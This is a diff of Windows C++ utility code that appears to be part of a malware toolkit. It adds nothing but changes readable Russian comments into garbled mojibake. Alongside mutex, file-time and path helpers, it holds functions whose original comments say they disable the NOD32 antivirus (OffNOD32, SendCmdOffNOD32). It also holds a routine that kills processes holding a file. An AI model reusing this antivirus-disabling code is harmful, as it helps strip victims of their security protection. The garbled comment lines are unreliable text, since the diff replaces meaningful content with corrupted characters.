-// Возвращает истину в случае обнаружения разделителя
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 bool IsDelimiterChar(char ch)
 {
 	return (' ' == ch || '\0' == ch);
 }
 
-// Возвращает параметр из списка по индексу.
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 string GetCommandParamByIndex(const char* ParamList, DWORD ArgIndex)
 {
 	DWORD        ParamCounter = 0;
 	const char*  Cur   = ParamList;
 
-	// Надо учесть, что в парсинге нужен конечный '\0' символ
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ '\0' пїЅпїЅпїЅпїЅпїЅпїЅ
 	const char*  Limit = ParamList + m_lstrlen(ParamList) + 1; 
 
 	while (Cur < Limit)
@@ -2786,8 +2797,8 @@ string GetCommandParamByIndex(const char* ParamList, DWORD ArgIndex)
 			Cur++;
 		}
 
-		// Условия предусматривающие наличие нескольких разделителей между 
-		// параметрами.
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ 
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 		if (ParamCounter == ArgIndex && param.Length() > 0) return param;
 		if (param.Length() > 0) ParamCounter++;
 		
@@ -2797,12 +2808,12 @@ string GetCommandParamByIndex(const char* ParamList, DWORD ArgIndex)
 	return string();
 }
 
-// Ф-ция для создания единственного экземпляра чего-либо.
-// Для обеспечения единственности используется захват мьютекса.
-// Всякий кто попробует захватить его снова - завершится с таймаутом.
+// пїЅ-пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ-пїЅпїЅпїЅпїЅ.
+// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 // 
-// В случае успешного захвата возвращает хендл захваченного мьютекса
-// В случае неуспешного захвата возвращает NULL
+// пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+// пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ NULL
 //
 HANDLE TryCreateSingleInstance(const char* MutexPrefix)
 {
@@ -2810,7 +2821,7 @@ HANDLE TryCreateSingleInstance(const char* MutexPrefix)
 
 	m_memset(MutexName, 0, sizeof(MutexName));
 
-	// Создаем имя для мьютекса в пространстве имен Global
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ Global
 	PCHAR MachineId = MakeMachineID();
 	
 	m_lstrcat(MutexName, "Global\\");
@@ -2819,8 +2830,8 @@ HANDLE TryCreateSingleInstance(const char* MutexPrefix)
 
 	//DBG("TryCreateSingleInstance", "Mutex name '%s'.", MutexName);
 
-	// При создании делаем нулевой DACL для возможности открытия мьютекса 
-	// из под любого пользователя
+	// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ DACL пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 
+	// пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	SECURITY_ATTRIBUTES sa;
 	SECURITY_DESCRIPTOR sd;
@@ -2832,7 +2843,7 @@ HANDLE TryCreateSingleInstance(const char* MutexPrefix)
 	sa.lpSecurityDescriptor = &sd;
 	sa.bInheritHandle = FALSE;
 
-	// Создаем мьютекс с нулевым DACL
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ DACL
 	HANDLE MutexHandle = (HANDLE)pCreateMutexA(&sa, FALSE, MutexName);
 	if (MutexHandle == NULL) return NULL;
 
@@ -2845,7 +2856,7 @@ HANDLE TryCreateSingleInstance(const char* MutexPrefix)
 
 	return MutexHandle;
 }
-//ждет пока кто-то захватит мьютекс, wait - сколько ждать в миллисекундах
+//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ-пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, wait - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 bool WaitCaptureMutex( const char* name, int wait )
 {
 	int time = 0;
@@ -2860,7 +2871,7 @@ bool WaitCaptureMutex( const char* name, int wait )
 	return false;
 }
 
-//захват мьютекса, wait - сколько ждать в миллисекундах
+//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, wait - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 HANDLE CaptureMutex( const char* name, int wait )
 {
 	int time = 0;
@@ -2877,24 +2888,24 @@ HANDLE CaptureMutex( const char* name, int wait )
 
 
 //------------------------------------------------------
-// LastWriteTime - Функция возвращает время в
-//                 миллисекундах с момента последнего
-//				   изменения файла
+// LastWriteTime - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ
+//                 пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//				   пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 //------------------------------------------------------
 DWORD File::LastWriteTime(HANDLE FileHandle)
 {
-	// Функция проверяет время последнего изменения файла
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 
-	// Получаем время файла
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	FILETIME Create, Write, Access, Now;
 
 	if (!pGetFileTime(FileHandle, &Create, &Access, &Write))
 		return 0;
 
-	// Получаем системное время
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	pGetSystemTimeAsFileTime(&Now);
 
-	// Сравниваем время
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	ULARGE_INTEGER  T1, T2;
 
 	T1.LowPart  = Now.dwLowDateTime;
@@ -2904,9 +2915,9 @@ DWORD File::LastWriteTime(HANDLE FileHandle)
 	T2.HighPart = Write.dwHighDateTime;
 
 
-	// Еденица измерения файлового времени 100 наносекунд
-	// по этому, для получения времени в милисекундах,
-	// делим разницу на константу
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ 100 пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ,
+	// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	DWORD Delta = (DWORD)(T1.QuadPart - T2.QuadPart) / 10000;
 
 	return Delta;
@@ -2985,7 +2996,7 @@ bool IsUserLocalSystem()
 	PISID sid = (PISID)attributes->Sid;
 
 	// LocalSystem SID S-1-5-18
-	// Процедура низкоуровневой сверки с SID LocalSystem
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ SID LocalSystem
 	if (sid->Revision != SID_REVISION) return false;
 	if (sid->SubAuthorityCount != 1) false;
 	if (m_memcmp(&sid->IdentifierAuthority, &kNtAuthority, sizeof(kNtAuthority)) != 0) return false;
@@ -3118,12 +3129,12 @@ static int FindBlockingProcesses( const char* FileName, ULONG* PIDs, int c_PIDs 
 	return procCount;
 }
 
-//уничтожает процессы которые держат указанный файл
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 void KillBlockingProcesses( const char* fileName )
 {
 	ULONG PIDS[10];
 
-	int counter = 0; //счетчик попыток уничтожения процессов
+	int counter = 0; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	int countProcess;
 	while( ( countProcess = FindBlockingProcesses( fileName, PIDS, 10 ) ) && counter < 3 )
 	{
@@ -3165,7 +3176,7 @@ DWORD GetProcessIdByName(PCHAR ProcessName)
 	return Result;
 }
 
-//Отключение NOD32
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ NOD32
 static VOID SendCmdOffNOD32(PVOID hObject)
 {
 	IO_STATUS_BLOCK StatusBlock;
@@ -3205,7 +3216,7 @@ static PVOID GetSystemInformation(SYSTEM_INFORMATION_CLASS dwInfoClass)
 	return pvInfo;
 }
 
-//Отключает НОД32
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ32
 VOID OffNOD32()
 {	
 	BOOL bRet = FALSE;
@@ -3248,13 +3259,13 @@ VOID OffNOD32()
 
 
 //---------------------------------------------------------
-//  Функция создаёт ярлык
-//  Параметры:
-//  	LinkFileName - Имя файла создаваемого ярлыка
-//      Object - объект на который будет ссылаться ярлык
-//      CommandLine - командная строка для запуска обхекта
-//      Description - Описание ярлыка/обхекта
-//      IconFileName - Имя файла иконки
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ:
+//  	LinkFileName - пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+//      Object - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+//      CommandLine - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//      Description - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ/пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//      IconFileName - пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 //---------------------------------------------------------
 void CreateLink( const char* LinkFileName, const char* Object, const char* CommandLine,
 						const char* Description, const char* IconFileName )
@@ -3281,14 +3292,14 @@ void CreateLink( const char* LinkFileName, const char* Object, const char* Comma
 
 
 //---------------------------------------------------------
-//  CombineFileName - функция создаёт полное имя файла
-//  на осное пути Path и имени файла FileName
+//  CombineFileName - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+//  пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ Path пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ FileName
 //---------------------------------------------------------
 string CombineFileName(const char* Path, const char* FileName)
 {
 	string F = Path;
 
-	// Добавляем слэш
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	if (!F.IsEmpty())
 	{
 		char C = F[F.Length() - 1];
@@ -3296,7 +3307,7 @@ string CombineFileName(const char* Path, const char* FileName)
 			F += "\\";
 	}
 
-	// Добавляем имя файла
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	if (!STRA::IsEmpty(FileName))
 	{
 		char C = *FileName;
@@ -3309,13 +3320,13 @@ string CombineFileName(const char* Path, const char* FileName)
 
 
 //---------------------------------------------------------
-//  IsWIN64 - Функция возвращает истину в случае если,
-//  Windows вляется 64 разрядным
+//  IsWIN64 - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ,
+//  Windows пїЅпїЅпїЅпїЅпїЅпїЅпїЅ 64 пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //
-//  To-Do: В данный момент функция проверяет архитектуру
-//         процессора, что даст нам ошибку если на 64 битном
-//         железе стоит 32 битная винда. Соответственно
-//         необходимо найти нормальный
+//  To-Do: пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//         пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ 64 пїЅпїЅпїЅпїЅпїЅпїЅ
+//         пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ 32 пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//         пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //---------------------------------------------------------
 bool IsWIN64()
 {
@@ -3326,12 +3337,12 @@ bool IsWIN64()
 
 
 //---------------------------------------------------------
-//  IsWOW64 - Функция возвращает истину если процесс, PID
-//            которого передали, запущен под системой WOW64,
-//            что означает запуск 32 битного процесса в 64
-//            битной винде
-//  Для получения информации о текущем процессе необходимо
-//  передать ередать нудевой пид:
+//  IsWOW64 - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, PID
+//            пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ WOW64,
+//            пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ 32 пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ 64
+//            пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+//  пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ:
 //  	IsWOW64(0);
 //---------------------------------------------------------
 bool IsWOW64(DWORD PID)
